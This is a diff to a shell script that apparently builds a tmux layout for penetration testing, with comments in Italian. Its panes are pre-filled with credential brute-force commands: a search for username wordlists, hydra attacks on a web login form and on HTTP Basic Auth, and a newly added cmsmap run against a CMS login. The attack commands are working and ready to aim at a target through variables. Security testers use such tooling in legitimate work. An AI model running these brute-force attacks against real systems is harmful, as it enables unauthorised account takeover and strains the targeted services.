@@ -29,16 +29,18 @@ cd $folderProject
 cd $folderProjectWebAuthN
 # Layout
 tmux new-window -t PT:2 -n 'WEB Bruteforce AuthN'
-tmux split-window -v -t PT:2.0
 tmux split-window -v -t PT:2.1
 tmux split-window -v -t PT:2.2
+tmux split-window -v -t PT:2.3
 # Esecuzione dei comandi nelle sottofinestre
 tmux send-keys -t PT:2.0 "# find valid dictionary" Enter
 tmux send-keys -t PT:2.0 "find /usr/share/seclists/ | grep user | xargs wc -l | sort -n"
 tmux send-keys -t PT:2.1 "# bruteforce POST authN" Enter
 tmux send-keys -t PT:2.1 "hydra $ip http-form-post \"/form/login.php:user=^USER^&pass=^PASS^:INVALID LOGIN\" -l $pathFile_users -P $pathFile_passwords -vV -f"
 tmux send-keys -t PT:2.2 "# bruteforce BasicAuth authN" Enter
-tmux send-keys -t PT:2.2 "hydra -L $pathFile_users -P $pathFile_passwords -f $ip http-get /monitoring # Bruteforce BasicAuth authN"
+tmux send-keys -t PT:2.2 "hydra -L $pathFile_users -P $pathFile_passwords -f $ip http-get / # Bruteforce BasicAuth authN"
+tmux send-keys -t PT:2.3 "# bruteforce CMS" Enter
+tmux send-keys -t PT:2.3 "sudo cmsmap https://$site -u $pathFile_users -p $pathFile_passwords -f W"
 cd $folderProject
 
 
